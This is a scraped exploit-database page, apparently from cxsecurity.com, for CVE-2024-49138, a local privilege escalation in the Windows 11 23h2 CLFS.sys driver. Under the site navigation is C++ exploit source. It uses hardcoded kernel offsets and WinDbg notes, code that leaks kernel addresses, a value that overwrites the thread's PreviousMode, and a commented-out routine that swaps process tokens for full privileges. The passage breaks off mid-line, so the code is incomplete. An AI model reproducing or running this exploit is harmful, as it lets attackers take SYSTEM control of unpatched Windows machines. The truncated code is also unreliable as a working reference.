---
title: Microsoft Windows 11 23h2 CLFS.sys Elevation of Privilege
url: https://cxsecurity.com/issue/WLB-2025060007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-09
fetch_date: 2025-10-06T22:50:08.515824
---

# Microsoft Windows 11 23h2 CLFS.sys Elevation of Privilege

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Microsoft Windows 11 23h2 CLFS.sys Elevation of Privilege** **2025.06.08**  Credit:  **[Milad Karimi](https://cxsecurity.com/author/Milad%2BKarimi/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2024-49138](https://cxsecurity.com/cveshow/CVE-2024-49138/ "Click to see CVE-2024-49138")**  CWE: **N/A** | |

# Exploit Title: Microsoft Windows 11 23h2 - CLFS.sys Elevation of Privilege
# Date: 2025-04-16
# Exploit Author: Milad Karimi (Ex3ptionaL)
# Contact: miladgrayhat@gmail.com
# Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL
# MiRROR-H: https://mirror-h.org/search/hacker/49626/
# CVE: CVE-2024-49138
#include <iostream>
#include <Windows.h>
#include <clfsw32.h>
#include <format>
#include <psapi.h>
#include <iostream>
#include <fstream>
#include <iomanip>
#include <vector>
#include <cstdint>
#include "resource.h"
#define CONTROL\_BLOCK\_SIZE 0x400
#define OFFSET\_EXTENDED\_STATE 0x84
#define OFFSET\_IEXTENDED\_BLOCK 0x88
#define OFFSET\_IFLUSHB\_BLOCK 0x8c
#define \_CRT\_SECURE\_NO\_WARNINGS 1
//dt nt!\_KTHREAD current
//+ 0x230 UserAffinityPrimaryGroup : 0
//+ 0x232 PreviousMode : 1 ''
//+ 0x233 BasePriority : 15 ''
//+ 0x234 PriorityDecrement : 0 ''
//+ 0x234 ForegroundBoost : 0y0000
//+ 0x234 UnusualBoost : 0y0000
//+ 0x235 Preempted : 0 ''
//+ 0x236 AdjustReason : 0 ''
//+ 0x237 AdjustIncrement : 0 ''
//+ 0x238 AffinityVersion : 0x14
//+ 0x240 Affinity : 0xffffc201`419e1a58 \_KAFFINITY\_EX
//WINDBG > dq ffffc201419e1080 + 0x232 L1
//ffffc201`419e12b2 00140000`00000f01
//WINDBG > ? nt!PoFxProcessorNotification - nt
//Evaluate expression : 3861424 = 00000000`003aebb0
//WINDBG > ? nt!DbgkpTriageDumpRestoreState - nt
//Evaluate expression : 8324768 = 00000000`007f06a0
//WINDBG > ? nt!PsActiveProcessHead - nt
//Evaluate expression : 12812128 = 00000000`00c37f60
#define POFXPROCESSORNOTIFICATION\_OFFSET 0x3aebb0
#define DBGKPTRIAGEDUMPRESTORESTATE\_OFFSET 0x7f06a0
#define PSACTIVEPROCESSHEAD\_OFFSET 0xc37f60
#define ACTIVEPROCESSLINKS\_OFFSET 0x448
#define UNIQUEPROCESSID\_OFFSET 0x440
#define TOKEN\_OFFSET 0x4b8
#define TOKENPRIVILEGESPRESENT\_OFFSET 0x40
#define TOKENPRIVILEGSENABLED\_OFFSET 0x48
#pragma comment(lib, "Clfsw32.lib")
LPVOID GetKernelBaseAddress() {
LPVOID drivers[1024]; // Array to hold driver addresses
DWORD cbNeeded; // Bytes returned by EnumDeviceDrivers
int driverCount;
TCHAR driverName[MAX\_PATH];
// Enumerate loaded device drivers
if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
printf("Failed to enumerate device drivers. Error: %lu\n",
GetLastError());
return (LPVOID)0x0;
}
driverCount = cbNeeded / sizeof(drivers[0]);
if (driverCount == 0) {
printf("No device drivers found.\n");
return (LPVOID)0x0;
}
// The first driver is usually the Windows kernel
LPVOID kernelBaseAddress = drivers[0];
// Retrieve the name of the kernel driver
if (GetDeviceDriverBaseName(kernelBaseAddress, driverName, MAX\_PATH)) {
printf("Kernel Base Address: 0x%p\n", kernelBaseAddress);
printf("Kernel Name: %ls\n", driverName);
}
else {
printf("Failed to retrieve kernel name. Error: %lu\n",
GetLastError());
}
return kernelBaseAddress;
}
#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 \* 1024 \* 2
using fNtQuerySystemInformation = NTSTATUS(WINAPI\*)(
ULONG SystemInformationClass,
PVOID SystemInformation,
ULONG SystemInformationLength,
PULONG ReturnLength
);
// Definitions for NTSTATUS and system calls
using fNtReadVirtualMemory = NTSTATUS(WINAPI\*)(
HANDLE ProcessHandle,
PVOID BaseAddress,
PVOID Buffer,
ULONG BufferSize,
PULONG NumberOfBytesRead);
using fNtWriteVirtualMemory = NTSTATUS(WINAPI\*)(
HANDLE ProcessHandle,
PVOID BaseAddress,
PVOID Buffer,
ULONG BufferSize,
PULONG NumberOfBytesWritten);
fNtReadVirtualMemory NtReadVirtualMemory = NULL;
fNtWriteVirtualMemory NtWriteVirtualMemory = NULL;
// handle information
typedef struct \_SYSTEM\_HANDLE\_TABLE\_ENTRY\_INFO
{
USHORT UniqueProcessId;
USHORT CreatorBackTraceIndex;
UCHAR ObjectTypeIndex;
UCHAR HandleAttributes;
USHORT HandleValue;
PVOID Object;
ULONG GrantedAccess;
} SYSTEM\_HANDLE\_TABLE\_ENTRY\_INFO, \* PSYSTEM\_HANDLE\_TABLE\_ENTRY\_INFO;
// handle table information
typedef struct \_SYSTEM\_HANDLE\_INFORMATION
{
ULONG NumberOfHandles;
SYSTEM\_HANDLE\_TABLE\_ENTRY\_INFO Handles[1];
} SYSTEM\_HANDLE\_INFORMATION, \* PSYSTEM\_HANDLE\_INFORMATION;
PVOID GetKAddrFromHandle(HANDLE handle) {
ULONG returnLength = 0;
fNtQuerySystemInformation NtQuerySystemInformation =
(fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll"),
"NtQuerySystemInformation");
PSYSTEM\_HANDLE\_INFORMATION handleTableInformation =
(PSYSTEM\_HANDLE\_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP\_ZERO\_MEMORY,
SystemHandleInformationSize);
NtQuerySystemInformation(SystemHandleInformation,
handleTableInformation, SystemHandleInformationSize, &returnLength);
ULONG numberOfHandles = handleTableInformation->NumberOfHandles;
HeapFree(GetProcessHeap(), 0, handleTableInformation);
handleTableInformation =
(PSYSTEM\_HANDLE\_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP\_ZERO\_MEMORY,
numberOfHandles \* sizeof(SYSTEM\_HANDLE\_TABLE\_ENTRY\_INFO) +
sizeof(SYSTEM\_HANDLE\_INFORMATION) + 0x100);
NtQuerySystemInformation(SystemHandleInformation,
handleTableInformation, numberOfHandles \*
sizeof(SYSTEM\_HANDLE\_TABLE\_ENTRY\_INFO) + sizeof(SYSTEM\_HANDLE\_INFORMATION)
+ 0x100, &returnLength);
for (int i = 0; i < handleTableInformation->NumberOfHandles; i++)
{
SYSTEM\_HANDLE\_TABLE\_ENTRY\_INFO handleInfo =
(SYSTEM\_HANDLE\_TABLE\_ENTRY\_INFO)handleTableInformation->Handles[i];
if (handleInfo.HandleValue == (USHORT)handle &&
handleInfo.UniqueProcessId == GetCurrentProcessId())
{
return handleInfo.Object;
}
}
}
LPVOID g\_ntbase = 0;
LPVOID address\_to\_write;
//Final byte = kthread.previousMode = 0
DWORD64 value\_to\_write = 0x0014000000000f00;
//BOOL SwapTokens() {
// DWORD64 eprocess = 0;
// ULONG bytesRead = 0;
// DWORD64 systemtoken = 0;
// DWORD64 currenttoken = 0;
// DWORD pid = 0;
// DWORD64 privileges = 0x0000001ff2ffffbc;
//
// NtReadVirtualMemory((HANDLE)-1, (LPVOID)((DWORD64)g\_ntbase +
PSAC...